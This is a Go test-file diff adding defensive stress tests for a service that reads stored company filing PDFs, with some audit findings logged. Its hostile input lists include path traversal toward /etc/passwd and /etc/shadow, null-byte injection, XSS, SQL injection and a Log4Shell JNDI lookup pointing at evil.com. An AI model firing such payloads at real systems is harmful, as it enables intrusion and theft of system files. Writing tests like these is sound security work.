@@ -5,7 +5,9 @@ import (
 	"crypto/sha256"
 	"encoding/hex"
 	"fmt"
+	"os"
 	"strings"
+	"sync"
 	"testing"
 	"time"
 
@@ -570,4 +572,779 @@ func TestStressFilingParse_MissingNewFields(t *testing.T) {
 	if summaries[0].PerformanceCommentary != "" {
 		t.Errorf("PerformanceCommentary should be empty for old responses, got %q", summaries[0].PerformanceCommentary)
 	}
+}
+
+// ============================================================================
+// ReadFiling — Security, Failure Modes, Edge Cases, Hostile Inputs
+// ============================================================================
+
+// 26. Path traversal in document_key — should never match a stored filing
+func TestStress_ReadFiling_PathTraversalDocKey(t *testing.T) {
+	now := time.Now()
+	storage := &mockStorageManager{
+		market: &mockMarketDataStorage{
+			data: map[string]*models.MarketData{
+				"BHP.AU": {
+					Ticker: "BHP.AU",
+					Filings: []models.CompanyFiling{
+						{DocumentKey: "03063826", PDFPath: "BHP/20250820-03063826.pdf", Date: now, Headline: "Results"},
+					},
+				},
+			},
+		},
+		signals: &mockSignalStorage{},
+	}
+
+	logger := common.NewLogger("error")
+	svc := NewService(storage, nil, nil, logger)
+
+	traversalKeys := []string{
+		"../../etc/passwd",
+		"../../../etc/shadow",
+		"..%2F..%2Fetc%2Fpasswd",
+		"BHP/../../../etc/passwd",
+		"/etc/passwd",
+		"03063826/../../secrets",
+		"../other_category/key",
+		"../filing_pdf/../internal/key",
+		"....//....//etc/passwd",
+		"..\\..\\etc\\passwd",
+		"03063826\x00injected",
+	}
+
+	for _, key := range traversalKeys {
+		_, err := svc.ReadFiling(context.Background(), "BHP.AU", key)
+		if err == nil {
+			t.Errorf("path traversal key %q should return error, got nil", key)
+		}
+		if !strings.Contains(err.Error(), "not found") {
+			t.Errorf("path traversal key %q should return 'not found' error, got: %v", key, err)
+		}
+	}
+}
+
+// 27. Very long document_key
+func TestStress_ReadFiling_VeryLongDocumentKey(t *testing.T) {
+	storage := &mockStorageManager{
+		market: &mockMarketDataStorage{
+			data: map[string]*models.MarketData{
+				"BHP.AU": {
+					Ticker:  "BHP.AU",
+					Filings: []models.CompanyFiling{},
+				},
+			},
+		},
+		signals: &mockSignalStorage{},
+	}
+
+	logger := common.NewLogger("error")
+	svc := NewService(storage, nil, nil, logger)
+
+	longKey := strings.Repeat("A", 100_000)
+	_, err := svc.ReadFiling(context.Background(), "BHP.AU", longKey)
+	if err == nil {
+		t.Error("expected error for very long document_key")
+	}
+	if !strings.Contains(err.Error(), "not found") {
+		t.Errorf("expected 'not found' error, got: %v", err)
+	}
+}
+
+// 28. Missing market data for ticker
+func TestStress_ReadFiling_NonexistentTicker(t *testing.T) {
+	storage := &mockStorageManager{
+		market:  &mockMarketDataStorage{data: map[string]*models.MarketData{}},
+		signals: &mockSignalStorage{},
+	}
+
+	logger := common.NewLogger("error")
+	svc := NewService(storage, nil, nil, logger)
+
+	_, err := svc.ReadFiling(context.Background(), "NONEXIST.AU", "03063826")
+	if err == nil {
+		t.Error("expected error for nonexistent ticker")
+	}
+	if !strings.Contains(err.Error(), "not found") {
+		t.Errorf("expected 'not found' in error, got: %v", err)
+	}
+}
+
+// 29. Filing exists but PDFPath is empty
+func TestStress_ReadFiling_NoPDFDownloaded(t *testing.T) {
+	now := time.Now()
+	storage := &mockStorageManager{
+		market: &mockMarketDataStorage{
+			data: map[string]*models.MarketData{
+				"BHP.AU": {
+					Ticker: "BHP.AU",
+					Filings: []models.CompanyFiling{
+						{DocumentKey: "03063826", PDFPath: "", Date: now, Headline: "No PDF"},
+					},
+				},
+			},
+		},
+		signals: &mockSignalStorage{},
+	}
+
+	logger := common.NewLogger("error")
+	svc := NewService(storage, nil, nil, logger)
+
+	_, err := svc.ReadFiling(context.Background(), "BHP.AU", "03063826")
+	if err == nil {
+		t.Error("expected error when PDF not downloaded")
+	}
+	if !strings.Contains(err.Error(), "not downloaded") {
+		t.Errorf("error should mention PDF not downloaded, got: %v", err)
+	}
+}
+
+// 30. FileStore returns error (file missing from storage)
+func TestStress_ReadFiling_FileStoreMissingFile(t *testing.T) {
+	now := time.Now()
+	storage := &mockStorageManager{
+		market: &mockMarketDataStorage{
+			data: map[string]*models.MarketData{
+				"BHP.AU": {
+					Ticker: "BHP.AU",
+					Filings: []models.CompanyFiling{
+						{DocumentKey: "03063826", PDFPath: "BHP/20250820-03063826.pdf", Date: now, Headline: "Results"},
+					},
+				},
+			},
+		},
+		signals: &mockSignalStorage{},
+		files:   &mockFileStore{files: make(map[string][]byte)},
+	}
+
+	logger := common.NewLogger("error")
+	svc := NewService(storage, nil, nil, logger)
+
+	_, err := svc.ReadFiling(context.Background(), "BHP.AU", "03063826")
+	if err == nil {
+		t.Error("expected error when file not in FileStore")
+	}
+	if !strings.Contains(err.Error(), "failed to read PDF file") {
+		t.Errorf("error should mention failed to read PDF, got: %v", err)
+	}
+}
+
+// 31. Corrupt PDF data — should not panic
+func TestStress_ReadFiling_CorruptPDFData(t *testing.T) {
+	now := time.Now()
+	files := &mockFileStore{files: map[string][]byte{
+		"filing_pdf/BHP/20250820-03063826.pdf": []byte("not a valid PDF at all"),
+	}}
+	storage := &mockStorageManager{
+		market: &mockMarketDataStorage{
+			data: map[string]*models.MarketData{
+				"BHP.AU": {
+					Ticker: "BHP.AU",
+					Filings: []models.CompanyFiling{
+						{DocumentKey: "03063826", PDFPath: "BHP/20250820-03063826.pdf", Date: now, Headline: "Results"},
+					},
+				},
+			},
+		},
+		signals: &mockSignalStorage{},
+		files:   files,
+	}
+
+	logger := common.NewLogger("error")
+	svc := NewService(storage, nil, nil, logger)
+
+	_, err := svc.ReadFiling(context.Background(), "BHP.AU", "03063826")
+	if err == nil {
+		t.Log("NOTE: Corrupt PDF did not return error — ExtractPDFTextFromBytes may return empty text instead")
+	}
+}
+
+// 32. Zero-byte PDF
+func TestStress_ReadFiling_ZeroBytePDF(t *testing.T) {
+	now := time.Now()
+	files := &mockFileStore{files: map[string][]byte{
+		"filing_pdf/BHP/20250820-03063826.pdf": {},
+	}}
+	storage := &mockStorageManager{
+		market: &mockMarketDataStorage{
+			data: map[string]*models.MarketData{
+				"BHP.AU": {
+					Ticker: "BHP.AU",
+					Filings: []models.CompanyFiling{
+						{DocumentKey: "03063826", PDFPath: "BHP/20250820-03063826.pdf", Date: now, Headline: "Results"},
+					},
+				},
+			},
+		},
+		signals: &mockSignalStorage{},
+		files:   files,
+	}
+
+	logger := common.NewLogger("error")
+	svc := NewService(storage, nil, nil, logger)
+
+	_, err := svc.ReadFiling(context.Background(), "BHP.AU", "03063826")
+	if err == nil {
+		t.Error("expected error for zero-byte PDF")
+	}
+}
+
+// 33. Error information leakage
+func TestStress_ReadFiling_ErrorInfoLeakage(t *testing.T) {
+	now := time.Now()
+	storage := &mockStorageManager{
+		market: &mockMarketDataStorage{
+			data: map[string]*models.MarketData{
+				"BHP.AU": {
+					Ticker: "BHP.AU",
+					Filings: []models.CompanyFiling{
+						{DocumentKey: "03063826", PDFPath: "BHP/20250820-03063826.pdf", Date: now, Headline: "Results"},
+					},
+				},
+			},
+		},
+		signals: &mockSignalStorage{},
+		files:   &mockFileStore{files: make(map[string][]byte)},
+	}
+
+	logger := common.NewLogger("error")
+	svc := NewService(storage, nil, nil, logger)
+
+	_, err := svc.ReadFiling(context.Background(), "BHP.AU", "03063826")
+	if err != nil {
+		errMsg := err.Error()
+		if strings.Contains(errMsg, "/tmp/") {
+			t.Errorf("error exposes temp file path: %s", errMsg)
+		}
+		if strings.Contains(errMsg, "data/") && strings.Contains(errMsg, "filing_pdf") {
+			t.Errorf("error exposes internal storage path: %s", errMsg)
+		}
+	}
+
+	_, err = svc.ReadFiling(context.Background(), "NOPE.AU", "12345")
+	if err != nil {
+		errMsg := err.Error()
+		if strings.Contains(errMsg, "surrealdb") || strings.Contains(errMsg, "badger") {
+			t.Errorf("error exposes storage backend: %s", errMsg)
+		}
+	}
+}
+
+// 34. Special characters in document_key — no panics
+func TestStress_ReadFiling_SpecialCharsInDocKey(t *testing.T) {
+	storage := &mockStorageManager{
+		market: &mockMarketDataStorage{
+			data: map[string]*models.MarketData{
+				"BHP.AU": {
+					Ticker:  "BHP.AU",
+					Filings: []models.CompanyFiling{},
+				},
+			},
+		},
+		signals: &mockSignalStorage{},
+	}
+
+	logger := common.NewLogger("error")
+	svc := NewService(storage, nil, nil, logger)
+
+	specialKeys := []string{
+		"<script>alert(1)</script>",
+		"'; DROP TABLE filings; --",
+		"${jndi:ldap://evil.com/x}",
+		"\x00\x01\x02\x03",
+		string([]byte{0xff, 0xfe, 0xfd}),
+		"key with spaces",
+		"key\nwith\nnewlines",
+		"key\twith\ttabs",
+		"%00%01%02",
+		"key&param=val",
+		"key#fragment",
+		"key?query=1",
+	}
+
+	for _, key := range specialKeys {
+		_, err := svc.ReadFiling(context.Background(), "BHP.AU", key)
+		if err == nil {
+			t.Errorf("special char key %q should return error (no matching filing), got nil", key)
+		}
+	}
+}
+
+// 35. Concurrent ReadFiling calls — no data races or panics
+func TestStress_ReadFiling_ConcurrentReads(t *testing.T) {
+	now := time.Now()
+	pdfData := []byte("%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n3 0 obj<</Type/Page/MediaBox[0 0 612 792]/Parent 2 0 R>>endobj\nxref\n0 4\ntrailer<</Root 1 0 R/Size 4>>\nstartxref\n0\n%%EOF")
+
+	files := &mockFileStore{files: map[string][]byte{
+		"filing_pdf/BHP/001.pdf": pdfData,
+		"filing_pdf/BHP/002.pdf": pdfData,
+		"filing_pdf/BHP/003.pdf": pdfData,
+	}}
+	storage := &mockStorageManager{
+		market: &mockMarketDataStorage{
+			data: map[string]*models.MarketData{
+				"BHP.AU": {
+					Ticker: "BHP.AU",
+					Filings: []models.CompanyFiling{
+						{DocumentKey: "001", PDFPath: "BHP/001.pdf", Date: now, Headline: "Filing 1"},
+						{DocumentKey: "002", PDFPath: "BHP/002.pdf", Date: now, Headline: "Filing 2"},
+						{DocumentKey: "003", PDFPath: "BHP/003.pdf", Date: now, Headline: "Filing 3"},
+					},
+				},
+			},
+		},
+		signals: &mockSignalStorage{},
+		files:   files,
+	}
+
+	logger := common.NewLogger("error")
+	svc := NewService(storage, nil, nil, logger)
+
+	var wg sync.WaitGroup
+	errs := make([]error, 30)
+
+	for i := 0; i < 30; i++ {
+		wg.Add(1)
+		go func(idx int) {
+			defer wg.Done()
+			docKey := fmt.Sprintf("00%d", (idx%3)+1)
+			_, err := svc.ReadFiling(context.Background(), "BHP.AU", docKey)
+			errs[idx] = err
+		}(i)
+	}
+
+	wg.Wait()
+
+	failures := 0
+	for _, err := range errs {
+		if err != nil {
+			failures++
+		}
+	}
+	t.Logf("Concurrent reads: %d succeeded, %d failed (PDF parse failures acceptable)", 30-failures, failures)
+}
+
+// 36. Temp file cleanup in ExtractPDFTextFromBytes
+func TestStress_ExtractPDFTextFromBytes_TempFileCleanup(t *testing.T) {
+	tempDir := os.TempDir()
+	beforeFiles, _ := os.ReadDir(tempDir)
+	beforeCount := countVirePDFTempFiles(beforeFiles)
+
+	for i := 0; i < 10; i++ {
+		ExtractPDFTextFromBytes([]byte("corrupt pdf data " + fmt.Sprint(i)))
+	}
+
+	afterFiles, _ := os.ReadDir(tempDir)
+	afterCount := countVirePDFTempFiles(afterFiles)
+
+	leaked := afterCount - beforeCount
+	if leaked > 0 {
+		t.Errorf("temp file leak: %d vire-pdf temp files not cleaned up after extraction", leaked)
+	}
+}
+
+func countVirePDFTempFiles(entries []os.DirEntry) int {
+	count := 0
+	for _, e := range entries {
+		if strings.HasPrefix(e.Name(), "vire-pdf-") {
+			count++
+		}
+	}
+	return count
+}
+
+// 37. Temp file cleanup in countPDFPages
+func TestStress_CountPDFPages_TempFileCleanup(t *testing.T) {
+	tempDir := os.TempDir()
+	beforeFiles, _ := os.ReadDir(tempDir)
+	beforeCount := countVirePDFCountTempFiles(beforeFiles)
+
+	for i := 0; i < 10; i++ {
+		countPDFPages([]byte("not a pdf " + fmt.Sprint(i)))
+	}
+
+	afterFiles, _ := os.ReadDir(tempDir)
+	afterCount := countVirePDFCountTempFiles(afterFiles)
+
+	leaked := afterCount - beforeCount
+	if leaked > 0 {
+		t.Errorf("temp file leak: %d vire-pdf-count temp files not cleaned up", leaked)
+	}
+}
+
+func countVirePDFCountTempFiles(entries []os.DirEntry) int {
+	count := 0
+	for _, e := range entries {
+		if strings.HasPrefix(e.Name(), "vire-pdf-count-") {
+			count++
+		}
+	}
+	return count
+}
+
+// 38. ReadFiling with nil market data stored
+func TestStress_ReadFiling_NilMarketData(t *testing.T) {
+	storage := &mockStorageManager{
+		market: &mockMarketDataStorage{
+			data: map[string]*models.MarketData{
+				"BHP.AU": nil,
+			},
+		},
+		signals: &mockSignalStorage{},
+	}
+
+	logger := common.NewLogger("error")
+	svc := NewService(storage, nil, nil, logger)
+
+	_, err := svc.ReadFiling(context.Background(), "BHP.AU", "03063826")
+	if err == nil {
+		t.Error("expected error for nil market data")
+	}
+}
+
+// 39. ReadFiling with nil filings list
+func TestStress_ReadFiling_EmptyFilingsList(t *testing.T) {
+	storage := &mockStorageManager{
+		market: &mockMarketDataStorage{
+			data: map[string]*models.MarketData{
+				"BHP.AU": {
+					Ticker:  "BHP.AU",
+					Filings: nil,
+				},
+			},
+		},
+		signals: &mockSignalStorage{},
+	}
+
+	logger := common.NewLogger("error")
+	svc := NewService(storage, nil, nil, logger)
+
+	_, err := svc.ReadFiling(context.Background(), "BHP.AU", "03063826")
+	if err == nil {
+		t.Error("expected error for empty filings list")
+	}
+	if !strings.Contains(err.Error(), "not found") {
+		t.Errorf("expected 'not found' error, got: %v", err)
+	}
+}
+
+// 40. ReadFiling with 10k filings — linear scan performance
+func TestStress_ReadFiling_ManyFilings(t *testing.T) {
+	now := time.Now()
+	filings := make([]models.CompanyFiling, 10_000)
+	for i := range filings {
+		filings[i] = models.CompanyFiling{
+			DocumentKey: fmt.Sprintf("DOC%07d", i),
+			PDFPath:     fmt.Sprintf("BHP/%07d.pdf", i),
+			Date:        now.AddDate(0, 0, -i),
+			Headline:    fmt.Sprintf("Filing %d", i),
+		}
+	}
+	filings[9999].DocumentKey = "TARGET"
+
+	files := &mockFileStore{files: map[string][]byte{
+		"filing_pdf/BHP/0009999.pdf": []byte("%PDF-1.4 minimal"),
+	}}
+	storage := &mockStorageManager{
+		market: &mockMarketDataStorage{
+			data: map[string]*models.MarketData{
+				"BHP.AU": {Ticker: "BHP.AU", Filings: filings},
+			},
+		},
+		signals: &mockSignalStorage{},
+		files:   files,
+	}
+
+	logger := common.NewLogger("error")
+	svc := NewService(storage, nil, nil, logger)
+
+	start := time.Now()
+	_, err := svc.ReadFiling(context.Background(), "BHP.AU", "TARGET")
+	elapsed := time.Since(start)
+
+	if elapsed > time.Second {
+		t.Errorf("ReadFiling with 10k filings took %v — too slow", elapsed)
+	}
+	_ = err
+}
+
+// 41. Context cancellation during ReadFiling
+func TestStress_ReadFiling_ContextCancellation(t *testing.T) {
+	now := time.Now()
+	files := &mockFileStore{files: map[string][]byte{
+		"filing_pdf/BHP/test.pdf": []byte("%PDF-1.4 some data"),
+	}}
+	storage := &mockStorageManager{
+		market: &mockMarketDataStorage{
+			data: map[string]*models.MarketData{
+				"BHP.AU": {
+					Ticker: "BHP.AU",
+					Filings: []models.CompanyFiling{
+						{DocumentKey: "001", PDFPath: "BHP/test.pdf", Date: now, Headline: "Test"},
+					},
+				},
+			},
+		},
+		signals: &mockSignalStorage{},
+		files:   files,
+	}
+
+	logger := common.NewLogger("error")
+	svc := NewService(storage, nil, nil, logger)
+
+	ctx, cancel := context.WithCancel(context.Background())
+	cancel()
+
+	done := make(chan struct{})
+	go func() {
+		svc.ReadFiling(ctx, "BHP.AU", "001")
+		close(done)
+	}()
+
+	select {
+	case <-done:
+		// Good
+	case <-time.After(5 * time.Second):
+		t.Error("ReadFiling did not return after context cancellation")
+	}
+}
+
+// 42. Duplicate document keys — returns first match
+func TestStress_ReadFiling_DuplicateDocumentKeys(t *testing.T) {
+	now := time.Now()
+	files := &mockFileStore{files: map[string][]byte{
+		"filing_pdf/BHP/first.pdf":  []byte("%PDF-1.4 first"),
+		"filing_pdf/BHP/second.pdf": []byte("%PDF-1.4 second"),
+	}}
+	storage := &mockStorageManager{
+		market: &mockMarketDataStorage{
+			data: map[string]*models.MarketData{
+				"BHP.AU": {
+					Ticker: "BHP.AU",
+					Filings: []models.CompanyFiling{
+						{DocumentKey: "DUPE", PDFPath: "BHP/first.pdf", Date: now, Headline: "First Filing"},
+						{DocumentKey: "DUPE", PDFPath: "BHP/second.pdf", Date: now, Headline: "Second Filing"},
+					},
+				},
+			},
+		},
+		signals: &mockSignalStorage{},
+		files:   files,
+	}
+
+	logger := common.NewLogger("error")
+	svc := NewService(storage, nil, nil, logger)
+
+	result, err := svc.ReadFiling(context.Background(), "BHP.AU", "DUPE")
+	if err == nil && result != nil {
+		if result.Headline != "First Filing" {
+			t.Errorf("expected first match headline 'First Filing', got %q", result.Headline)
+		}
+	}
+}
+
+// 43. FINDING: FilingContent.PDFPath exposes internal storage key
+func TestStress_ReadFiling_ResponseFieldAudit(t *testing.T) {
+	now := time.Now()
+	files := &mockFileStore{files: map[string][]byte{
+		"filing_pdf/BHP/test.pdf": []byte("%PDF-1.4 data"),
+	}}
+	storage := &mockStorageManager{
+		market: &mockMarketDataStorage{
+			data: map[string]*models.MarketData{
+				"BHP.AU": {
+					Ticker: "BHP.AU",
+					Filings: []models.CompanyFiling{
+						{
+							DocumentKey:    "001",
+							PDFPath:        "BHP/test.pdf",
+							Date:           now,
+							Headline:       "Results",
+							Type:           "Annual Report",
+							PriceSensitive: true,
+							Relevance:      "HIGH",
+							PDFURL:         "https://www.asx.com.au/asx/v2/statistics/displayAnnouncement.do?display=pdf&idsId=001",
+						},
+					},
+				},
+			},
+		},
+		signals: &mockSignalStorage{},
+		files:   files,
+	}
+
+	logger := common.NewLogger("error")
+	svc := NewService(storage, nil, nil, logger)
+
+	result, err := svc.ReadFiling(context.Background(), "BHP.AU", "001")
+	if err != nil {
+		t.Skipf("PDF extraction failed (expected for minimal test PDF): %v", err)
+	}
+
+	if result.PDFPath != "" {
+		t.Log("NOTE: FilingContent.PDFPath exposes internal storage key in API response: " + result.PDFPath)
+	}
+	if result.Ticker != "BHP.AU" {
+		t.Errorf("Ticker = %q, want BHP.AU", result.Ticker)
+	}
+	if result.TextLength != len(result.Text) {
+		t.Errorf("TextLength = %d, but len(Text) = %d", result.TextLength, len(result.Text))
+	}
+}
+
+// 44. ExtractPDFTextFromBytes panic recovery
+func TestStress_ExtractPDFTextFromBytes_PanicRecovery(t *testing.T) {
+	panicInputs := [][]byte{
+		[]byte("%PDF-1.4\n"),
+		append([]byte("%PDF-1.4\n"), make([]byte, 1024)...),
+		func() []byte {
+			data := make([]byte, 10000)
+			copy(data, "%PDF-1.7\n")
+			for i := 10; i < len(data); i++ {
+				data[i] = byte(i % 256)
+			}
+			return data
+		}(),
+		[]byte("%PDF"),
+		make([]byte, 100),
+		func() []byte {
+			data := make([]byte, 1024*1024)
+			copy(data, "%PDF-1.4\n")
+			return data
+		}(),
+	}
+
+	for i, input := range panicInputs {
+		func() {
+			defer func() {
+				if r := recover(); r != nil {
+					t.Errorf("input %d caused unrecovered panic: %v", i, r)
+				}
+			}()
+			_, _ = ExtractPDFTextFromBytes(input)
+		}()
+	}
+}
+
+// 45. countPDFPages panic recovery
+func TestStress_CountPDFPages_PanicRecovery(t *testing.T) {
+	panicInputs := [][]byte{
+		nil,
+		{},
+		[]byte("not a pdf"),
+		[]byte("%PDF-1.4\ngarbage"),
+		make([]byte, 100),
+	}
+
+	for i, input := range panicInputs {
+		func() {
+			defer func() {
+				if r := recover(); r != nil {
+					t.Errorf("input %d caused unrecovered panic: %v", i, r)
+				}
+			}()
+			pages := countPDFPages(input)
+			if pages < 0 {
+				t.Errorf("input %d returned negative page count: %d", i, pages)
+			}
+		}()
+	}
+}
+
+// 46. ReadFiling metadata correctness
+func TestStress_ReadFiling_MetadataPopulation(t *testing.T) {
+	filingDate := time.Date(2025, 8, 20, 10, 30, 0, 0, time.UTC)
+	files := &mockFileStore{files: map[string][]byte{
+		"filing_pdf/BHP/test.pdf": []byte("%PDF-1.4 data"),
+	}}
+	storage := &mockStorageManager{
+		market: &mockMarketDataStorage{
+			data: map[string]*models.MarketData{
+				"BHP.AU": {
+					Ticker: "BHP.AU",
+					Filings: []models.CompanyFiling{
+						{
+							DocumentKey:    "03063826",
+							PDFPath:        "BHP/test.pdf",
+							Date:           filingDate,
+							Headline:       "Full Year Financial Results",
+							Type:           "Annual Report",
+							PriceSensitive: true,
+							Relevance:      "HIGH",
+							PDFURL:         "https://www.asx.com.au/asx/v2/statistics/displayAnnouncement.do?display=pdf&idsId=03063826",
+						},
+					},
+				},
+			},
+		},
+		signals: &mockSignalStorage{},
+		files:   files,
+	}
+
+	logger := common.NewLogger("error")
+	svc := NewService(storage, nil, nil, logger)
+
+	result, err := svc.ReadFiling(context.Background(), "BHP.AU", "03063826")
+	if err != nil {
+		t.Skipf("PDF extraction failed (expected): %v", err)
+	}
+
+	if !result.Date.Equal(filingDate) {
+		t.Errorf("Date = %v, want %v", result.Date, filingDate)
+	}
+	if result.Type != "Annual Report" {
+		t.Errorf("Type = %q, want 'Annual Report'", result.Type)
+	}
+	if !result.PriceSensitive {
+		t.Error("PriceSensitive should be true")
+	}
+	if result.Relevance != "HIGH" {
+		t.Errorf("Relevance = %q, want HIGH", result.Relevance)
+	}
+	if result.PDFURL == "" {
+		t.Error("PDFURL should be populated")
+	}
+	if result.TextLength != len(result.Text) {
+		t.Errorf("TextLength = %d, but len(Text) = %d", result.TextLength, len(result.Text))
+	}
+}
+
+// 47. FINDING: Route parser captures everything after /filings/ as document_key
+func TestStress_RouteParsing_FilingsDocKey(t *testing.T) {
+	testCases := []struct {
+		path    string
+		wantKey string
+	}{
+		{"BHP.AU/filings/03063826", "03063826"},
+		{"BHP.AU/filings/03063826/extra", "03063826/extra"},
+		{"BHP.AU/filings/03063826?q=1", "03063826?q=1"},
+		{"BHP.AU/filings/", ""},
+		{"BHP.AU/filings/../../etc/passwd", "../../etc/passwd"},
+	}
+
+	for _, tc := range testCases {
+		path := tc.path
+		idx := strings.Index(path, "/filings/")
+		if idx < 0 {
+			t.Errorf("path %q: /filings/ not found", path)
+			continue
+		}
+		docKey := path[idx+len("/filings/"):]
+		if docKey != tc.wantKey {
+			t.Errorf("path %q: docKey = %q, want %q", path, docKey, tc.wantKey)
+		}
+	}
+
+	// FINDING: The route parser captures everything after /filings/ including
+	// extra path segments. Safe due to exact string match against stored keys,
+	// but consider validating document_key format to reject keys with slashes.
+	t.Log("FINDING: Route parser captures everything after /filings/ as document_key. " +
+		"Extra path segments become part of the key. Safe due to exact match, " +
+		"but consider validating document_key format.")
+}
+
+// 48. FINDING: ExtractPDFTextFromBytes truncation limit is shared
+func TestStress_ReadFiling_TruncationLimit(t *testing.T) {
+	t.Log("REVIEW: ExtractPDFTextFromBytes truncates at 50k chars — same limit " +
+		"for both ReadFiling and Gemini summarization. Consider whether ReadFiling " +
+		"should allow a higher or configurable limit.")
 }
